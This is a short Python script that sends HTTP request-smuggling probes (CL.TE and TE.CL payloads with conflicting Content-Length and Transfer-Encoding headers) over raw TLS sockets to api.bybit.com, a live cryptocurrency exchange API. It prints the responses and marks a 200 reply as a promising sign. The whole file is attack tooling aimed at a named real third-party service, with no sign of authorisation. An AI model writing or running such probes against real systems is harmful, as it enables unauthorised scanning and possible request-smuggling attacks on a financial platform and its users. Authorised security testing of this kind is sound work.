#!/usr/bin/env python3
import socket
import ssl

HOST = "api.bybit.com"
PORT = 443

context = ssl.create_default_context()

def send_raw(payload):
    try:
        sock = socket.create_connection((HOST, PORT))
        ssock = context.wrap_socket(sock, server_hostname=HOST)
        ssock.sendall(payload.encode())
        data = ssock.recv(4096)
        ssock.close()
        return data.decode(errors='ignore')
    except Exception as e:
        return str(e)

print("="*80)
print("HTTP SMUGGLING PROBE")
print("="*80)

# CL.TE Probe
cl_te_payload = (
    "POST /v5/market/time HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    "Connection: keep-alive\r\n"
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "1\r\n"
    "Z\r\n"
    "Q\r\n"
)

print("\n[1] Sending CL.TE Probe")
resp = send_raw(cl_te_payload)
print(f"Response:\n{resp[:300]}...")

if "HTTP/1.1 5" in resp or "HTTP/1.1 400" in resp:
    print("  -> Likely safe (server rejected malformed request)")
elif "HTTP/1.1 200" in resp:
    print("  -> Interesting (200 OK on potential smuggle)")

# TE.CL Probe
te_cl_payload = (
    "POST /v5/market/time HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    "Connection: keep-alive\r\n"
    "Content-Length: 6\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "X"
)

print("\n[2] Sending TE.CL Probe")
resp = send_raw(te_cl_payload)
print(f"Response:\n{resp[:300]}...")
